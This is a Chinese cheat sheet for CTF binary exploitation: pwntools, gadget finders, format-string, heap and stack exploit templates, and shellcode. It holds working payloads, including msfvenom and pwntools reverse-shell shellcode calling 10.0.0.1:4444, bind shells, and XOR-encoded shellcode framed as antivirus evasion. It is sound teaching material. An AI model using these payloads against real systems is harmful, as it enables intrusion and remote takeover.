# 附录：pwntools常用API速查

```python
from pwn import *

# === 上下文设置 ===
context.arch = 'amd64'          # 架构
context.os = 'linux'             # 操作系统
context.log_level = 'debug'      # 日志级别
context.terminal = ['tmux', 'splitw', '-h']  # 调试终端

# === 进程/连接 ===
p = process('./binary')          # 本地进程
p = remote('host', port)         # 远程连接
p = gdb.debug('./binary', 'b main\nc')  # gdb调试
p = listen(port)                 # 监听

# === 数据收发 ===
p.send(data)                     # 发送数据
p.sendline(data)                 # 发送数据+换行
p.recv(n)                        # 接收n字节
p.recvline()                     # 接收一行
p.recvuntil(b'delimiter')        # 接收到指定字符串
p.recvall()                      # 接收全部
p.interactive()                  # 交互模式

# === 打包/解包 ===
p32(0xdeadbeef)                  # 32位打包（小端）
p64(0xdeadbeef)                  # 64位打包（小端）
u32(b'\xef\xbe\xad\xde')       # 32位解包
u64(b'\xef\xbe\xad\xde\x00\x00\x00\x00')  # 64位解包

# === 汇编/反汇编 ===
asm('mov eax, 0')                # 汇编
disasm(b'\xb8\x00\x00\x00\x00')  # 反汇编
shellcraft.sh()                  # 生成shellcode
shellcraft.cat('/flag')          # 读取文件shellcode

# === ELF操作 ===
elf = ELF('./binary')
elf.symbols['main']              # 获取符号地址
elf.plt['puts']                  # PLT地址
elf.got['puts']                  # GOT地址
elf.search(b'/bin/sh')           # 搜索字符串

# === ROP ===
rop = ROP(elf)
rop.call('system', [binsh_addr]) # 构造ROP调用
rop.chain()                      # 生成ROP链
rop.dump()                       # 打印ROP链

# === 格式化字符串 ===
fmtstr_payload(offset, {addr: value})  # 自动构造

# === 信号帧 (SROP) ===
frame = SigreturnFrame()
frame.rax = 59
frame.rdi = binsh_addr
frame.rip = syscall_addr

# === 循环模式 ===
cyclic(200)                      # 生成pattern
cyclic_find(0x6161616b)          # 查找偏移

# === 查找gadget ===
# 命令行: ROPgadget --binary ./binary | grep "pop rdi"
# 命令行: one_gadget /path/to/libc.so.6
```

---

## 🛠️ 补充：实战拓展 — 漏洞利用工具与Payload速查

### 一、ROP 工具链与gadget搜索

**1. ROPgadget**

```bash
# 基本搜索
ROPgadget --binary ./binary
ROPgadget --binary ./binary --only "pop|ret"
ROPgadget --binary ./binary --string "/bin/sh"

# 按指令类型过滤
ROPgadget --binary ./binary --only "pop rdi ; ret"
ROPgadget --binary ./binary --only "xchg"
ROPgadget --binary ./binary --only "syscall"

# 搜索特定寄存器操作
ROPgadget --binary ./binary --only "mov eax"
ROPgadget --binary ./binary --only "add|sub"

# 从指定范围搜索
ROPgadget --binary ./binary --range 0x400000-0x401000

# 生成ROP链（自动利用）
ROPgadget --binary ./binary --ropchain

# 输出详细信息
ROPgadget --binary ./binary --verbose

# 指定架构
ROPgadget --binary ./binary --arch x86_64
ROPgadget --binary ./binary --arch arm
```

**2. one_gadget**

```bash
# 基本使用（查找libc中能直接getshell的gadget）
one_gadget /lib/x86_64-linux-gnu/libc.so.6
one_gadget ./libc.so.6

# 显示所有约束条件
one_gadget --all ./libc.so.6
one_gadget -f ./libc.so.6

# 详细输出
one_gadget -v ./libc.so.6

# 指定级别（级别越高，约束越宽松）
one_gadget -l 1 ./libc.so.6   # 级别1：约束最少
one_gadget -l 2 ./libc.so.6   # 级别2：中等约束
one_gadget -l 3 ./libc.so.6   # 级别3：约束最多（默认）

# 仅显示gadget地址
one_gadget --raw ./libc.so.6

# 使用示例
# $ one_gadget ./libc.so.6
# 0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   rcx == NULL
#
# 0x4f322 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL
#
# 0x10a38c execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
```

**3. ropper**

```bash
# 搜索gadget
ropper --file ./binary --search "pop rdi; ret"
ropper -f ./binary --search "pop%"

# 显示所有gadget
ropper -f ./binary

# 搜索字符串
ropper -f ./binary --string "/bin/sh"
ropper -f ./binary --string "flag"

# 搜索特定指令
ropper -f ./binary --type jop  # Jump Oriented Programming
ropper -f ./binary --type sys  # 系统调用指令

# 生成ropchain
ropper -f ./binary --chain execve

# 多文件搜索（同时搜binary和libc）
ropper -f ./binary --file ./libc.so.6 --search "pop rdi"

# 交互式模式
ropper -f ./binary --console
```

**4. pwntools 中 ROP 模块高级用法**

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

elf = ELF('./binary')
libc = ELF('./libc.so.6')
rop = ROP([elf, libc])

# 查找gadget
rop.find_gadget(['pop rdi', 'ret'])  # 查找pop rdi; ret
rop.find_gadget(['ret'])             # 找ret指令（栈对齐）
rop.find_gadget(['pop rsi', 'pop r15', 'ret'])

# 自动构造调用
rop.call(elf.plt['puts'], [elf.got['puts']])  # puts(puts@got)
rop.call(elf.sym['main'])                      # 跳回main

# 系统调用构造 (x86_64)
rop.rax = 59  # execve
rop.rdi = binsh_addr
rop.rsi = 0
rop.rdx = 0
rop.call('syscall')

# SROP (Sigreturn Oriented Programming)
frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = binsh_addr
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_addr
payload = b'A' * offset + p64(syscall_addr) + bytes(frame)

# 打印完整ROP链
print(rop.dump())

# 生成payload
payload = rop.chain()
```

---

### 二、Shellcode 速查与生成

**1. pwntools shellcraft**

```python
from pwn import *
context.arch = 'amd64'  # i386, arm, aarch64, mips等

# 生成 execve /bin/sh shellcode
shellcode = shellcraft.sh()
print(shellcode)        # 打印汇编
print(asm(shellcode))   # 汇编成机器码

# 生成读取文件shellcode
shellcode = shellcraft.cat('/flag')
shellcode = shellcraft.cat('/etc/passwd')

# 生成反向shell shellcode
shellcode = shellcraft.connect('10.0.0.1', 4444)
shellcode += shellcraft.dupsh(4)  # 将shell重定向到socket

# 生成绑定shell shellcode
shellcode = shellcraft.bindsh(4444)

# 系统调用shellcode
shellcode = shellcraft.syscall('execve', '/bin/sh', 0, 0)
shellcode = shellcraft.syscall('read', 0, 'rsp', 100)
shellcode = shellcraft.syscall('write', 1, 'rsp', 100)
shellcode = shellcraft.syscall('exit', 0)

# 条件分支shellcode
shellcode = shellcraft.pushstr('hello')
shellcode += shellcraft.write(1, 'rsp', 5)

# 生成自定义汇编
custom = """
    xor rax, rax
    xor rdi, rdi
    xor rsi, rsi
    xor rdx, rdx
    mov al, 59
    mov rdi, 0x68732f6e69622f
    push rdi
    mov rdi, rsp
    syscall
"""
shellcode = asm(custom)
```

**2. 常见 Shellcode 模板**

```python
# x86_64 Linux execve("/bin/sh") - 27字节
# 方法1: 栈上构造字符串
shellcode_x64_execve = asm("""
    xor rax, rax
    xor rdi, rdi
    xor rsi, rsi
    xor rdx, rdx
    mov al, 59
    push rax
    mov rbx, 0x68732f6e69622f2f  # //bin/sh
    push rbx
    mov rdi, rsp
    syscall
""")

# x86 (32位) Linux execve("/bin/sh") - 28字节
shellcode_x86_execve = asm("""
    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx
    xor edx, edx
    mov al, 11
    push eax
    push 0x68732f2f   # //sh
    push 0x6e69622f   # /bin
    mov ebx, esp
    int 0x80
""", arch='i386')

# 读文件shellcode (x64) - 输出到stdout
shellcode_readfile = asm("""
    xor rax, rax
    xor rdi, rdi
    xor rsi, rsi
    xor rdx, rdx
    
    /* open("/flag", O_RDONLY) */
    mov al, 2
    push 0x67616c66   # flag
    mov rdi, rsp
    xor rsi, rsi      # O_RDONLY
    syscall
    
    /* read(fd, buf, 100) */
    mov rdi, rax      # fd
    xor rax, rax      # sys_read
    mov rsi, rsp      # buffer
    mov rdx, 100      # count
    syscall
    
    /* write(1, buf, n) */
    mov rdx, rax      # 读取的字节数
    mov rax, 1        # sys_write
    mov rdi, 1        # stdout
    syscall
    
    /* exit */
    mov rax, 60
    xor rdi, rdi
    syscall
""")

# 反向shell (x64, 连接到 10.0.0.1:4444)
shellcode_reverse_shell = asm(shellcraft.connect('10.0.0.1', 4444) + shellcraft.dupsh(4))
```

**3. Shellcode 编码与免杀**

```python
from pwn import *

# 检查坏字符
def has_badchars(shellcode, badchars=b'\x00\x0a\x0d'):
    for b in badchars:
        if b in shellcode:
            return True, shellcode.index(b)
    return False, -1

# 自解码shellcode模板（异或编码）
def xor_encode(shellcode, key=0x41):
    encoded = bytes([b ^ key for b in shellcode])
    # 解码器 + 编码后的shellcode
    decoder = asm(f"""
        jmp short call_decoder
    decoder:
        pop rsi
        xor rcx, rcx
        mov cl, {len(encoded)}
    decode_loop:
        xor byte ptr [rsi + rcx - 1], {key}
        loop decode_loop
        jmp short shellcode
    call_decoder:
        call decoder
    shellcode:
    """)
    return decoder + encoded

# alphanumeric shellcode (字母数字shellcode)
# 用于有字符限制的场景
# 使用 msfvenom 生成:
# msfvenom -p linux/x64/exec CMD=/bin/sh -f python -e x64/alpha_mixed BufferRegister=RAX

# 打印shellcode长度和十六进制
sc = asm(shellcraft.sh())
print(f"Length: {len(sc)} bytes")
print(f"Hex: {sc.hex()}")
print(f"\\x escaped: {''.join(f'\\\\x{b:02x}' for b in sc)}")
```

**4. msfvenom 生成 Payload**

```bash
# === Linux 平台 ===

# Linux x86_64 execve shellcode
msfvenom -p linux/x64/exec CMD="/bin/sh" -f python
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f python
msfvenom -p linux/x64/shell_bind_tcp LPORT=4444 -f python

# Linux x86 (32位)
msfvenom -p linux/x86/exec CMD="/bin/sh" -f python
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f python

# === Windows 平台 ===

# Windows x64
msfvenom -p windows/x64/exec CMD=calc.exe -f python
msfvenom -p windows/x64/messagebox TEXT=hello TITLE=test -f python
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f python

# Windows x86
msfvenom -p windows/exec CMD=calc.exe -f python
msfvenom -p windows/messagebox TEXT=hello TITLE=test -f python

# === 编码器 ===

# 避免坏字符
msfvenom -p linux/x64/exec CMD="/bin/sh" -b '\x00\x0a\x0d' -f python
msfvenom -p linux/x64/exec CMD="/bin/sh" -e x64/xor -b '\x00' -f python

# 字母数字编码
msfvenom -p linux/x64/exec CMD="/bin/sh" -e x64/alpha_mixed BufferRegister=RAX -f python

# === 输出格式 ===
# -f python    Python格式
# -f c         C语言数组
# -f raw       原始二进制
# -f hex       十六进制字符串
# -f java      Java字节数组
# -f ruby      Ruby格式
# -f perl      Perl格式
# -f csharp    C#格式
# -f ps1       PowerShell格式
# -f exe       可执行文件
# -f dll       DLL文件
# -f elf       ELF文件

# 指定架构和平台
msfvenom --list archs
msfvenom --list platforms
msfvenom -l payloads | grep linux
```

---

### 三、格式化字符串漏洞利用速查

**1. 基本探测 Payload**

```python
# 探测偏移量
payload = b'AAAA%p.%p.%p.%p.%p.%p.%p.%p'
# 输出中找到 0x41414141 的位置，即为偏移

# 更高效的探测
for i in range(1, 30):
    payload = f'AAABBBB%{i}$p'.encode()
    # 如果输出包含 0x42424242，则偏移为 i

# 一次探测全部偏移（使用循环模式）
payload = cyclic(100).replace(b'\x00', b'A')
payload += b'%s.%s.%s...'  # 注意：%s可能导致崩溃
```

**2. 任意地址读**

```python
# 使用 %s 读取任意地址的字符串
# 格式: [addr]%offset$s
def fmtstr_read(addr, offset):
    """读取指定地址的字符串"""
    payload = p32(addr) + f'%{offset}$s'.encode()
    return payload

# 使用 %p 读取指针值
# 格式: %offset$p  读取第offset个参数为指针

# 逐字节读取内存（读取4字节整数）
def fmtstr_read_int(addr, offset):
    """读取4字节整数"""
    # 使用 %n 反过来，或用 %s 拼接
    payload = p64(addr) + f'%{offset}$s'.encode()
    # 发送后读取输出，直到遇到\x00
```

**3. 任意地址写（%n 家族）**

```python
# %n  - 写入已输出字符数到指定地址（4字节）
# %hn - 写入2字节（short）
# %hhn - 写入1字节（char）
# %ln - 写入8字节（long long，64位）

# pwntools 自动构造
from pwn import *
context.arch = 'amd64'

# 简单写入: 将 value 写入 addr
payload = fmtstr_payload(offset, {addr: value})

# 多地址写入
writes = {
    0x601000: 0xdeadbeef,   # 写入4字节
    0x601008: 0xcafebabe,
}
payload = fmtstr_payload(offset, writes)

# 写入1字节（更短的payload）
payload = fmtstr_payload(offset, {addr: value}, numbwritten=0, write_size='byte')
# write_size: 'byte' (hhn), 'short' (hn), 'int' (n)

# 已输出字符数不为0时
payload = fmtstr_payload(offset, {addr: value}, numbwritten=8)
```

**4. 手动构造格式化字符串 Payload**

```python
# 32位系统，手动构造单字节写入
def fmtstr_write_32(addr, value, offset):
    """32位下用%hhn逐字节写入"""
    payload = b''
    for i in range(4):
        target_byte = (value >> (i * 8)) & 0xff
        # 地址部分
        payload += p32(addr + i)
    
    # 格式化部分
    prev = 0
    for i in range(4):
        target = (value >> (i * 8)) & 0xff
        if target < prev:
            target += 256
        padding = target - prev
        if padding > 0:
            payload += f'%{padding}c'.encode()
        else:
            # 已经够了，不输出padding
            pass
        payload += f'%{offset + i}$hhn'.encode()
        prev = (value >> (i * 8)) & 0xff
    
    return payload

# 64位系统，手动构造
# 注意：64位下地址通常包含\x00，需要把地址放在payload末尾
def fmtstr_write_64(addr, value, offset):
    """64位下构造格式化字符串写入"""
    # pwntools的fmtstr_payload会自动处理，推荐直接用
    return fmtstr_payload(offset, {addr: value})
```

**5. 常见利用场景**

```python
# 场景1: 改写GOT表项 → 控制程序流程
# 将 printf@GOT 改成 system 地址
# 然后让程序调用 printf("/bin/sh") 即执行 system("/bin/sh")

# 场景2: 改写栈上返回地址 → 控制EIP/RIP
# 泄露栈地址 → 计算返回地址位置 → 用%n改写

# 场景3: 改写__stack_chk_fail@GOT → 绕过Canary
# 将栈检查失败函数改成返回指令

# 场景4: 泄露libc基址
# 用%s读取GOT表中函数地址 → 计算libc基址
def leak_libc(p, offset, got_addr):
    """通过格式化字符串泄露libc地址"""
    payload = p64(got_addr) + f'%{offset}$s'.encode()
    p.sendline(payload)
    data = p.recvuntil(b'\x7f')  # 通常libc地址以0x7f开头
    # 解析地址
    ...
    return libc_addr
```

---

### 四、堆利用工具速查

**1. pwndbg 堆调试命令**

```bash
# 堆相关命令（pwndbg插件）
heap                     # 显示堆概览
heap bins                # 显示所有bins
heap chunks              # 显示所有堆块
heap fastbins            # 显示fastbins
heap unsortedbin         # 显示unsorted bin
heap smallbins           # 显示small bins
heap largebins           # 显示large bins
heap tcache              # 显示tcache
heap top                 # 显示top chunk
heap arenas              # 显示所有arena

# 查找堆块
find_fake_fast addr      # 查找伪造的fastbin
find_stack_overflow      # 查找栈溢出

# 可视化
vis_heap_chunks          # 可视化堆块
bins                     # 显示bins（另一个命令）

# 检查
checksec                 # 检查保护机制
canary                   # 显示canary值
```

**2. LIBC heap 调试环境变量**

```bash
# 启用 malloc 调试
MALLOC_CHECK_=3 ./binary        # 启用内存检查
MALLOC_CHECK_=1 ./binary        # 打印错误但继续

# 详细输出（需要调试版libc）
MALLOC_TRACE=trace.log ./binary  # 记录malloc调用日志

# 关闭各种优化（便于调试）
MALLOC_MMAP_THRESHOLD_=0 ./binary  # 都用mmap分配

# 环境变量设置
export LIBC_FATAL_STDERR_=1        # 错误输出到stderr
```

**3. 常用堆利用脚本模板**

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

def add(index, size, content):
    """添加堆块"""
    p.sendlineafter(b'choice: ', b'1')
    p.sendlineafter(b'index: ', str(index).encode())
    p.sendlineafter(b'size: ', str(size).encode())
    p.sendafter(b'content: ', content)

def delete(index):
    """释放堆块"""
    p.sendlineafter(b'choice: ', b'2')
    p.sendlineafter(b'index: ', str(index).encode())

def show(index):
    """查看堆块内容"""
    p.sendlineafter(b'choice: ', b'3')
    p.sendlineafter(b'index: ', str(index).encode())
    return p.recvuntil(b'\n1.', drop=True)

def edit(index, content):
    """编辑堆块内容"""
    p.sendlineafter(b'choice: ', b'4')
    p.sendlineafter(b'index: ', str(index).encode())
    p.sendafter(b'content: ', content)

# === UAF 泄露 libc ===
add(0, 0x90, b'A' * 0x20)  # 大到进入unsorted bin
add(1, 0x20, b'B' * 0x10)  # 防止top chunk合并
delete(0)                   # 释放后fd/bk指向main_arena
data = show(0)              # UAF读取
libc_leak = u64(data[:8])
libc_base = libc_leak - 0x3ebca0  # 相对偏移（根据libc版本调整）
log.success(f"libc_base: {hex(libc_base)}")

# === Tcache poisoning ===
# 利用UAF修改fd指针，使malloc返回任意地址
delete(0)
edit(0, p64(target_addr))   # 修改fd → target_addr
add(0, 0x20, b'C' * 0x10)   # 从tcache取出
add(1, 0x20, p64(shell_addr))  # 这个chunk就在target_addr处！

# === House of Spirit ===
# 在可控区域构造fake chunk，然后free
fake_chunk = b'\x00' * 8    # prev_size
fake_chunk += p64(0x41)     # size (0x40 + 1 for inuse)
fake_chunk += p64(0) * 6    # fd, bk, ...
# 将fake_chunk放在可控位置
# 然后 free(fake_chunk_addr + 0x10)  → 相当于free用户数据指针
```

---

### 五、栈溢出利用模板速查

**1. ret2text (32位)**

```python
from pwn import *

context.arch = 'i386'
elf = ELF('./binary')

# 找后门函数或 /bin/sh + system
backdoor = elf.sym['backdoor']  # 直接有后门函数
binsh = next(elf.search(b'/bin/sh'))
system = elf.sym['system']

payload = b'A' * offset + p32(system) + p32(0) + p32(binsh)
# offset 是缓冲区到返回地址的偏移
```

**2. ret2libc (64位)**

```python
from pwn import *

context.arch = 'amd64'
elf = ELF('./binary')
libc = ELF('./libc.so.6')
rop = ROP(elf)

# 第一步：泄露puts@GOT地址
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]  # 栈对齐

payload = b'A' * offset
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.sym['main'])  # 返回main以便第二次利用

p.sendline(payload)
puts_addr = u64(p.recvline().strip().ljust(8, b'\x00'))
libc_base = puts_addr - libc.sym['puts']
log.success(f"libc_base: {hex(libc_base)}")

# 第二步：getshell
system = libc_base + libc.sym['system']
binsh = libc_base + next(libc.search(b'/bin/sh'))

payload = b'A' * offset
payload += p64(ret)          # 栈对齐（16字节对齐）
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

p.sendline(payload)
p.interactive()
```

**3. ret2csu**

```python
# 利用 __libc_csu_init 中的gadget控制多个寄存器
# x64下当找不到足够的pop gadget时使用

def ret2csu(call_addr, rdi, rsi, rdx, elf):
    """构造ret2csu链（通用gadget）"""
    # csu gadget:
    # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
    # mov rdx, r14; mov rsi, r13; mov edi, r12d; call [r15+rbx*8]
    
    csu1 = 0x40056a  # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
    csu2 = 0x400550  # mov rdx, r14; mov rsi, r13; mov edi, r12d; call [r15+rbx*8]
    
    payload = b''
    payload += p64(csu1)
    payload += p64(0)              # rbx = 0
    payload += p64(1)              # rbp = 1 (防止循环)
    payload += p64(rdi)            # r12 → edi
    payload += p64(rsi)            # r13 → rsi
    payload += p64(rdx)            # r14 → rdx
    payload += p64(call_addr)      # r15 → 调用的函数指针地址
    payload += p64(csu2)
    payload += p64(0) * 7         # 平衡栈（csu2后再pop 6个 + ret）
    return payload
```

**4. SROP (Sigreturn Oriented Programming)**

```python
from pwn import *
from pwnlib.constants import SYS_execve, SYS_sigreturn

context.arch = 'amd64'

# 当控制了rax和rip，但寄存器不够用时
# 利用 sigreturn 系统调用一次性设置所有寄存器

syscall_addr = 0x401000  # syscall; ret gadget
binsh_addr = 0x602000    # /bin/sh 字符串地址

frame = SigreturnFrame()
frame.rax = SYS_execve
frame.rdi = binsh_addr
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_addr

payload = b'A' * offset
payload += p64(syscall_addr)  # 触发sigreturn
payload += bytes(frame)
# 注意：需要先设置rax=15 (sigreturn的系统调用号)
```

---

### 六、漏洞利用辅助工具

**1. checksec**

```bash
# 检查二进制保护机制
checksec --file=./binary
pwn checksec ./binary        # pwntools自带

# 输出示例:
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
```

**2. seccomp-tools**

```bash
# 分析seccomp沙箱规则
seccomp-tools dump ./binary
seccomp-tools disasm binary.bpf
seccomp-tools asm "policy.txt" -o binary.bpf

# 查看允许的系统调用
seccomp-tools dump ./binary | grep -i "ALLOW"

# 检测常见系统调用是否可用
seccomp-tools checksec ./binary
```

**3. patchelf / pwninit**

```bash
# 修改ELF的解释器和rpath（使用指定libc）
patchelf --set-interpreter ./ld-linux-x86-64.so.2 ./binary
patchelf --set-rpath . ./binary
patchelf --replace-needed libc.so.6 ./libc.so.6 ./binary

# pwninit: 自动设置pwn环境
pwninit
# 自动：
# 1. 下载对应版本的libc和ld
# 2. patchelf设置解释器
# 3. 生成solve.py模板
```

**4. libc-database / libc.blukat.me**

```bash
# 本地libc数据库
# 克隆: git clone https://github.com/niklasb/libc-database.git
# 添加libc: ./add /path/to/libc.so.6

# 根据泄露的函数地址查找libc版本
./find puts 0x7ffff7a649c0
# 输出可能匹配的libc版本和偏移

# 在线查询: https://libc.blukat.me/
# 输入函数名+地址，查询对应libc版本
```

**5. ROPgadget + one_gadget 组合使用**

```bash
# 快速找到能getshell的gadget
one_gadget ./libc.so.6 --raw

# 验证gadget约束是否满足
# 1. 先通过泄露获取libc基址
# 2. 计算gadget地址
# 3. 检查约束条件（如 rcx==NULL, [rsp+0x40]==NULL 等）
# 4. 构造ROP链满足约束
```

**6. 其他实用工具**

```bash
# 寻找溢出偏移（cyclic模式）
pwn cyclic 100          # 生成100字节的循环模式
pwn cyclic -l 0x6161616b  # 查找偏移量

# 汇编/反汇编
pwn asm 'mov eax, 0'
pwn disasm 'b800000000'

# 查看ELF符号
pwn elfdiff a.so b.so   # 比较两个ELF差异

# shellcode
pwn shellcraft amd64.linux.sh
pwn shellcraft -f d amd64.linux.sh  # 调试模式，显示汇编
```

---

